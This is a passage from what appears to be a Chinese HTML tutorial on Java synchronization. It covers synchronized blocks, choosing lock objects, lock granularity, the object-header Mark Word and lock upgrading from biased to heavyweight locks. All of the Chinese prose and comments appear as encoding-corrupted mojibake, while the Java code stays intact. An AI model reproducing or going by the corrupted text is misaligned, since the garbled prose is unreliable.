    <span class="hljs-comment">// ä½¿ç”¨æŒ‡å®šçš„é”å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(lock) {
            count++;
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨thisä½œä¸ºé”ï¼ˆç­‰ä»·äºsynchronizedæ–¹æ³•ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
            count++;
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨ç±»å¯¹è±¡ä½œä¸ºé”ï¼ˆç­‰ä»·äºsynchronizedé™æ€æ–¹æ³•ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment3</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(Counter.class) {
            <span class="hljs-comment">// é™æ€ä»£ç å—</span>
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>çµæ´»æ€§é«˜</strong>ï¼šå¯ä»¥æŒ‡å®šä»»æ„å¯¹è±¡ä½œä¸ºé”</li>
<li><strong>ç²’åº¦æ›´ç»†</strong>ï¼šåªé”ä½å¿…è¦çš„ä»£ç ï¼Œä¸é”æ•´ä¸ªæ–¹æ³•</li>
<li><strong>æ€§èƒ½æ›´å¥½</strong>ï¼šå‡å°‘é”çš„æŒæœ‰æ—¶é—´</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆæ¨èä½¿ç”¨ä»£ç å—ï¼Ÿ</strong></p>
<ul>
<li>å¯ä»¥åªé”ä½å¿…è¦çš„ä»£ç ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–¹æ³•</li>
<li>æé«˜å¹¶å‘æ€§èƒ½</li>
<li>æ›´çµæ´»ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„é”å¯¹è±¡</li>
</ul>
<h4 data-id="heading-56">é”çš„å¯¹è±¡ï¼ˆé‡è¦æ¦‚å¿µï¼‰</h4>
<p><strong>æ ¸å¿ƒåŸåˆ™ï¼šåªæœ‰ä½¿ç”¨åŒä¸€ä¸ªå¯¹è±¡ä½œä¸ºé”ï¼Œæ‰ä¼šäº’æ–¥</strong></p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>synchronizedé”çš„æ˜¯<strong>å¯¹è±¡</strong>ï¼Œä¸æ˜¯ä»£ç </li>
<li>å¤šä¸ªçº¿ç¨‹ä½¿ç”¨<strong>åŒä¸€ä¸ªå¯¹è±¡</strong>ä½œä¸ºé” â†’ äº’æ–¥</li>
<li>å¤šä¸ªçº¿ç¨‹ä½¿ç”¨<strong>ä¸åŒå¯¹è±¡</strong>ä½œä¸ºé” â†’ ä¸äº’æ–¥</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// é”1</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// é”2</span>

<span class="hljs-comment">// ä½¿ç”¨lock1ä½œä¸ºé”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {
        <span class="hljs-comment">// æ“ä½œ1</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨lock2ä½œä¸ºé”ï¼ˆä¸method1ä¸äº’æ–¥ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock2) {
        <span class="hljs-comment">// æ“ä½œ2</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨lock1ä½œä¸ºé”ï¼ˆä¸method1äº’æ–¥ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method3</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {
        <span class="hljs-comment">// æ“ä½œ3ï¼Œä¸method1äº’æ–¥</span>
    }
}
</code></pre>
<p><strong>äº’æ–¥å…³ç³»æ€»ç»“ï¼š</strong></p>

































<table><thead><tr><th>æ–¹æ³•</th><th>ä½¿ç”¨çš„é”</th><th>method1</th><th>method2</th><th>method3</th></tr></thead><tbody><tr><td>method1</td><td>lock1</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td></tr><tr><td>method2</td><td>lock2</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td></tr><tr><td>method3</td><td>lock1</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td></tr></tbody></table>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>âš ï¸ é”å¯¹è±¡ä¸èƒ½æ˜¯nullï¼Œå¦åˆ™ä¼šæŠ›å‡º<code>NullPointerException</code></li>
<li>âœ… æ¨èä½¿ç”¨<code>final</code>ä¿®é¥°é”å¯¹è±¡ï¼Œé˜²æ­¢è¢«é‡æ–°èµ‹å€¼</li>
<li>âœ… ä½¿ç”¨ä¸“é—¨çš„é”å¯¹è±¡ï¼ˆå¦‚<code>private final Object lock</code>ï¼‰ï¼Œè€Œä¸æ˜¯thisæˆ–ä¸šåŠ¡å¯¹è±¡</li>
</ul>
<h4 data-id="heading-57">é”çš„ç²’åº¦</h4>
<p><strong>ä»€ä¹ˆæ˜¯é”çš„ç²’åº¦ï¼Ÿ</strong></p>
<ul>
<li><strong>ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å¤§å°</li>
<li><strong>ç²—ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å¤§ï¼ˆå¦‚æ•´ä¸ªæ–¹æ³•ï¼‰</li>
<li><strong>ç»†ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å°ï¼ˆå¦‚å‡ è¡Œä»£ç ï¼‰</li>
</ul>
<p><strong>åŸåˆ™ï¼šå°½é‡ä½¿ç”¨ç»†ç²’åº¦é”ï¼Œæé«˜å¹¶å‘æ€§èƒ½</strong></p>
<h5 data-id="heading-58">ç²—ç²’åº¦é”ï¼ˆä¸æ¨èï¼‰</h5>
<p><strong>é—®é¢˜ï¼š</strong> é”ä½äº†ä¸éœ€è¦é”çš„ä»£ç ï¼Œå¯¼è‡´ä¸å¿…è¦çš„äº’æ–¥</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ ç²—ç²’åº¦é”ï¼šé”ä½æ•´ä¸ªæ–¹æ³•</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment1</span><span class="hljs-params">()</span> {
    count1++;
    <span class="hljs-comment">// å…¶ä»–ä¸ç›¸å…³çš„æ“ä½œ...</span>
    <span class="hljs-comment">// æ•´ä¸ªæ–¹æ³•éƒ½è¢«é”ä½ï¼Œå½±å“æ€§èƒ½</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
    count2++;  
    <span class="hljs-comment">// ä¸increment1äº’æ–¥ï¼Œä½†å®é™…ä¸Šæ²¡å¿…è¦</span>
    <span class="hljs-comment">// å› ä¸ºcount1å’Œcount2æ˜¯ä¸åŒçš„å˜é‡</span>
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>count1å’Œcount2æ˜¯ä¸åŒçš„å˜é‡ï¼Œäº’ä¸å¹²æ‰°</li>
<li>ä½†ä½¿ç”¨synchronizedæ–¹æ³•ï¼Œå¯¼è‡´å®ƒä»¬äº’æ–¥</li>
<li>é™ä½äº†å¹¶å‘æ€§èƒ½</li>
</ul>
<h5 data-id="heading-59">ç»†ç²’åº¦é”ï¼ˆæ¨èï¼‰</h5>
<p><strong>ä¼˜ç‚¹ï¼š</strong> åªé”ä½å¿…è¦çš„ä»£ç ï¼Œæé«˜å¹¶å‘æ€§</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… ç»†ç²’åº¦é”ï¼šåªé”ä½å¿…è¦çš„ä»£ç </span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// count1çš„é”</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// count2çš„é”</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {  <span class="hljs-comment">// åªé”count1ç›¸å…³çš„æ“ä½œ</span>
        count1++;
    }
    <span class="hljs-comment">// å…¶ä»–æ“ä½œä¸å—é”å½±å“ï¼Œå¯ä»¥å¹¶å‘æ‰§è¡Œ</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock2) {  <span class="hljs-comment">// åªé”count2ç›¸å…³çš„æ“ä½œ</span>
        count2++;
    }
    <span class="hljs-comment">// ä¸increment1ä¸äº’æ–¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œ</span>
}
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼š</strong></p>
<ul>
<li><strong>ç²—ç²’åº¦é”</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹æ“ä½œcount1å’Œcount2æ—¶ï¼Œéœ€è¦ä¸²è¡Œæ‰§è¡Œ</li>
<li><strong>ç»†ç²’åº¦é”</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹æ“ä½œcount1å’Œcount2æ—¶ï¼Œå¯ä»¥å¹¶è¡Œæ‰§è¡Œ</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šç»†ç²’åº¦é”æ˜æ˜¾æ›´å¥½</li>
</ul>
<p><strong>æœ€ä½³å®è·µï¼š</strong></p>
<ul>
<li>âœ… ä½¿ç”¨ä¸åŒçš„é”å¯¹è±¡ä¿æŠ¤ä¸åŒçš„èµ„æº</li>
<li>âœ… åªé”ä½å¿…è¦çš„ä»£ç æ®µ</li>
<li>âœ… å°½é‡å‡å°‘é”çš„æŒæœ‰æ—¶é—´</li>
</ul>
<h3 data-id="heading-60">3.2 synchronizedåŸç†</h3>
<h4 data-id="heading-61">å¯¹è±¡å¤´ç»“æ„</h4>
<p><strong>Javaå¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼š</strong></p>
<p>æ¯ä¸ªJavaå¯¹è±¡åœ¨å†…å­˜ä¸­éƒ½æœ‰å¯¹è±¡å¤´ï¼Œå¯¹è±¡å¤´ä¸­åŒ…å«äº†é”çš„ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-css" lang="css">Javaå¯¹è±¡å†…å­˜å¸ƒå±€ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´ï¼ˆ<span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">Header</span>ï¼‰              â”‚
â”‚  â”œâ”€â”€ <span class="hljs-selector-tag">Mark</span> Wordï¼ˆ<span class="hljs-number">8</span>å­—èŠ‚ï¼‰              â”‚ â† é”ä¿¡æ¯å­˜å‚¨åœ¨è¿™é‡Œ
â”‚  â”œâ”€â”€ Class Pointerï¼ˆ<span class="hljs-number">4</span>/<span class="hljs-number">8</span>å­—èŠ‚ï¼‰        â”‚ â† æŒ‡å‘ç±»ä¿¡æ¯
â”‚  â””â”€â”€ Array Lengthï¼ˆ<span class="hljs-number">4</span>å­—èŠ‚ï¼Œä»…æ•°ç»„ï¼‰    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®ï¼ˆInstance Dataï¼‰           â”‚ â† å¯¹è±¡çš„å­—æ®µå€¼
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……ï¼ˆ<span class="hljs-attribute">Padding</span>ï¼‰                 â”‚ â† å†…å­˜å¯¹é½
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li><strong>Mark Word</strong>ï¼šæœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå­˜å‚¨é”çš„çŠ¶æ€ä¿¡æ¯</li>
<li><strong>Class Pointer</strong>ï¼šæŒ‡å‘ç±»çš„å…ƒæ•°æ®ä¿¡æ¯</li>
<li>JVMé€šè¿‡ä¿®æ”¹Mark Wordæ¥å®ç°é”æœºåˆ¶</li>
</ul>
<h4 data-id="heading-62">Mark Wordè¯¦è§£</h4>
<p><strong>Mark Wordæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>Mark Wordæ˜¯å¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡è‡ªèº«çš„è¿è¡Œæ—¶æ•°æ®ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯¹è±¡çš„å“ˆå¸Œç ï¼ˆhashCodeï¼‰</li>
<li>å¯¹è±¡çš„åˆ†ä»£å¹´é¾„ï¼ˆç”¨äºGCï¼‰</li>
<li><strong>é”çš„æ ‡å¿—ä½ï¼ˆæœ€é‡è¦çš„ï¼‰</strong></li>
</ul>
<p><strong>Mark Wordåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨çš„å†…å®¹ï¼š</strong></p>
<p><strong>64ä½JVMçš„Mark Wordç»“æ„ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">Mark</span> Word (<span class="hljs-number">64</span>ä½)
â”œâ”€â”€ é”çŠ¶æ€ï¼ˆ<span class="hljs-number">2</span>ä½ï¼‰ï¼šæ ‡è¯†å½“å‰é”çš„ç±»å‹
â””â”€â”€ å…¶ä»–æ•°æ®ï¼ˆ<span class="hljs-number">62</span>ä½ï¼‰ï¼šæ ¹æ®é”çŠ¶æ€ä¸åŒï¼Œå­˜å‚¨ä¸åŒå†…å®¹

é”çŠ¶æ€åˆ†ç±»ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é”çŠ¶æ€   â”‚ <span class="hljs-selector-tag">Mark</span> Wordå†…å®¹                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ— é”     â”‚ å¯¹è±¡çš„hashCode + åˆ†ä»£å¹´é¾„ + çŠ¶æ€ä½<span class="hljs-number">01</span>  â”‚
â”‚ åå‘é”   â”‚ çº¿ç¨‹ID + Epoch + åˆ†ä»£å¹´é¾„ + çŠ¶æ€ä½<span class="hljs-number">01</span>  â”‚
â”‚ è½»é‡çº§é” â”‚ æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ + çŠ¶æ€ä½<span class="hljs-number">00</span>        â”‚
â”‚ é‡é‡çº§é” â”‚ æŒ‡å‘monitorå¯¹è±¡çš„æŒ‡é’ˆ + çŠ¶æ€ä½<span class="hljs-number">10</span>       â”‚
â”‚ GCæ ‡è®°   â”‚ ç©º + çŠ¶æ€ä½<span class="hljs-number">11</span>                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li><strong>æ— é”</strong>ï¼šæ­£å¸¸å¯¹è±¡ï¼Œæ²¡æœ‰çº¿ç¨‹ç«äº‰</li>
<li><strong>åå‘é”</strong>ï¼šåªæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œè®°å½•çº¿ç¨‹ID</li>
<li><strong>è½»é‡çº§é”</strong>ï¼šæœ‰ç«äº‰ä½†ä¸æ¿€çƒˆï¼Œä½¿ç”¨CASå’Œè‡ªæ—‹</li>
<li><strong>é‡é‡çº§é”</strong>ï¼šç«äº‰æ¿€çƒˆï¼Œä½¿ç”¨æ“ä½œç³»ç»Ÿçº§åˆ«çš„é”</li>
</ul>
<h4 data-id="heading-63">é”çš„å‡çº§è¿‡ç¨‹</h4>
<p><strong>é”å‡çº§çš„ç›®çš„ï¼š</strong> æ ¹æ®ç«äº‰æƒ…å†µåŠ¨æ€è°ƒæ•´é”ç­–ç•¥ï¼Œåœ¨ä¿è¯çº¿ç¨‹å®‰å…¨çš„å‰æä¸‹ï¼Œå°½å¯èƒ½æé«˜æ€§èƒ½ã€‚</p>
<p><strong>å‡çº§è·¯å¾„ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ— é” â†’ åå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”
<span class="hljs-code">      ï¼ˆå•å‘å‡çº§ï¼Œä¸èƒ½é™çº§ï¼‰
</span></code></pre>
<h5 data-id="heading-64">æ— é”çŠ¶æ€</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> å¯¹è±¡åˆšåˆ›å»ºæ—¶ï¼Œæ²¡æœ‰ä»»ä½•çº¿ç¨‹ä½¿ç”¨ï¼Œå¤„äºæ— é”çŠ¶æ€</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-comment">// æ­¤æ—¶objçš„Mark Wordå¤„äºæ— é”çŠ¶æ€</span>
<span class="hljs-comment">// é”æ ‡å¿—ä½ï¼š01ï¼Œæ²¡æœ‰åå‘ä½</span>
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¯¹è±¡åˆšåˆ›å»º</li>
<li>æ²¡æœ‰çº¿ç¨‹è®¿é—®åŒæ­¥ä»£ç å—</li>
<li>æ­£å¸¸çš„å¯¹è±¡çŠ¶æ€</li>
</ul>
<h5 data-id="heading-65">åå‘é”ï¼ˆBiased Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> ä¼˜åŒ–å•çº¿ç¨‹é‡å¤è·å–é”çš„åœºæ™¯</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨é”</li>
<li>åŒä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡è·å–åŒä¸€ä¸ªé”</li>
<li>æ²¡æœ‰çœŸæ­£çš„ç«äº‰</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>ç¬¬ä¸€æ¬¡è·å–é”ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> çº¿ç¨‹1ç¬¬ä¸€æ¬¡è¿›å…¥synchronizedå—
<span class="hljs-bullet">2.</span> æ£€æŸ¥Mark Wordï¼šæ˜¯å¦ä¸ºå¯åå‘çŠ¶æ€ï¼Ÿ
<span class="hljs-bullet">3.</span> æ˜¯ï¼šåœ¨Mark Wordä¸­è®°å½•çº¿ç¨‹1çš„ID
<span class="hljs-bullet">4.</span> å°†é”çŠ¶æ€è®¾ç½®ä¸ºåå‘é”
<span class="hljs-bullet">5.</span> ä¹‹åçº¿ç¨‹1å†è¿›å…¥æ—¶ï¼Œç›´æ¥æ£€æŸ¥çº¿ç¨‹IDï¼Œç›¸åŒå°±ç›´æ¥æ‰§è¡Œ
</code></pre>
<p><strong>å†æ¬¡è·å–é”ï¼ˆåŒä¸€çº¿ç¨‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> çº¿ç¨‹1å†æ¬¡è¿›å…¥synchronizedå—
<span class="hljs-bullet">2.</span> æ£€æŸ¥Mark Wordä¸­çš„çº¿ç¨‹IDï¼šæ˜¯å¦æ˜¯è‡ªå·±ï¼Ÿ
<span class="hljs-bullet">3.</span> æ˜¯ï¼šç›´æ¥æ‰§è¡Œï¼Œæ— éœ€ä»»ä½•åŒæ­¥æ“ä½œï¼ˆå¾ˆå¿«ï¼ï¼‰
<span class="hljs-bullet">4.</span> å°±åƒ"å…æ£€é€šé“"ï¼Œæ— éœ€æ’é˜Ÿ
</code></pre>
<p><strong>ä»£ç ç¤ºä¾‹ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ç¬¬ä¸€æ¬¡ï¼šå‡çº§ä¸ºåå‘é”ï¼Œè®°å½•çº¿ç¨‹ID</span>
        <span class="hljs-comment">// ä¹‹ååŒä¸€çº¿ç¨‹ï¼šç›´æ¥æ‰§è¡Œï¼Œå‡ ä¹æ— å¼€é”€</span>
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šå•çº¿ç¨‹åœºæ™¯</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// çº¿ç¨‹Aå¤šæ¬¡è°ƒç”¨ï¼Œéƒ½å¾ˆå¿«ï¼ˆåå‘é”ä¼˜åŒ–ï¼‰</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    c.increment();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡å¼€å§‹å°±å¾ˆå¿«äº†</span>
}
</code></pre>
<p><strong>åå‘é”çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… <strong>æ€§èƒ½æå¥½</strong>ï¼šåŒä¸€çº¿ç¨‹å†æ¬¡è·å–é”å‡ ä¹æ— å¼€é”€</li>
<li>âœ… <strong>é€‚åˆå•çº¿ç¨‹åœºæ™¯</strong>ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹å°±æ˜¯å•çº¿ç¨‹ä½¿ç”¨</li>
<li>âœ… <strong>å‡å°‘åŒæ­¥å¼€é”€</strong>ï¼šé¿å…CASæ“ä½œ</li>
</ul>
<p><strong>åå‘é”çš„è·å–æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ£€æŸ¥Mark Wordçš„é”æ ‡å¿—ä½ï¼ˆæ˜¯å¦ä¸º01ï¼Œå¯åå‘ï¼‰
   â”œâ”€ æ˜¯ â†’ ç»§ç»­
   â””â”€ å¦ â†’ å·²æœ‰å…¶ä»–é”çŠ¶æ€ï¼Œè·³è¿‡åå‘é”

<span class="hljs-bullet">2.</span> æ£€æŸ¥çº¿ç¨‹IDæ˜¯å¦æŒ‡å‘å½“å‰çº¿ç¨‹
   â”œâ”€ æ˜¯ â†’ ç›´æ¥è¿›å…¥åŒæ­¥ä»£ç å—ï¼ˆæœ€å¿«è·¯å¾„ï¼‰
   â””â”€ å¦ â†’ å°è¯•CASæ›¿æ¢çº¿ç¨‹ID
<span class="hljs-code">       â”œâ”€ æˆåŠŸ â†’ è·å¾—åå‘é”
       â””â”€ å¤±è´¥ â†’ æ’¤é”€åå‘é”ï¼Œå‡çº§ä¸ºè½»é‡çº§é”
</span></code></pre>
<h5 data-id="heading-66">è½»é‡çº§é”ï¼ˆLightweight Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> å½“æœ‰å¤šä¸ªçº¿ç¨‹ç«äº‰ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆæ—¶ï¼Œä½¿ç”¨CASè‡ªæ—‹ä»£æ›¿é˜»å¡</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æœ‰å¤šä¸ªçº¿ç¨‹ç«äº‰é”</li>
<li>ä½†ç«äº‰ä¸æ¿€çƒˆï¼ˆå¤§éƒ¨åˆ†CASèƒ½æˆåŠŸï¼‰</li>
<li>ç­‰å¾…æ—¶é—´çŸ­</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>è·å–é”çš„è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åœ¨æ ˆä¸­åˆ›å»ºé”è®°å½•ï¼ˆLock Recordï¼‰
<span class="hljs-bullet">2.</span> å¤åˆ¶å¯¹è±¡å¤´çš„Mark Wordåˆ°é”è®°å½•ï¼ˆå¤‡ä»½ï¼‰
<span class="hljs-bullet">3.</span> CASå°è¯•å°†å¯¹è±¡å¤´çš„Mark Wordæ›¿æ¢ä¸ºé”è®°å½•çš„æŒ‡é’ˆ
   â”œâ”€ æˆåŠŸ â†’ è·å¾—è½»é‡çº§é”ï¼ˆå¾ˆå¿«ï¼Œä½¿ç”¨CASï¼‰
   â””â”€ å¤±è´¥ â†’ æœ‰å…¶ä»–çº¿ç¨‹åœ¨ç«äº‰ï¼Œè‡ªæ—‹é‡è¯•
<span class="hljs-code">       â”œâ”€ è‡ªæ—‹æˆåŠŸ â†’ è·å¾—é”
       â””â”€ è‡ªæ—‹å¤±è´¥ï¼ˆè‡ªæ—‹æ¬¡æ•°è¿‡å¤šï¼‰â†’ å‡çº§ä¸ºé‡é‡çº§é”
</span></code></pre>
<p><strong>ä¸ºä»€ä¹ˆå«"è½»é‡çº§"ï¼Ÿ</strong></p>
<ul>
<li>ä¸éœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼ˆé‡é‡çº§é”éœ€è¦ï¼‰</li>
<li>ä½¿ç”¨CASè‡ªæ—‹ï¼Œçº¿ç¨‹ä¸é˜»å¡</li>
<li>å¼€é”€æ¯”é‡é‡çº§é”å°</li>
</ul>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
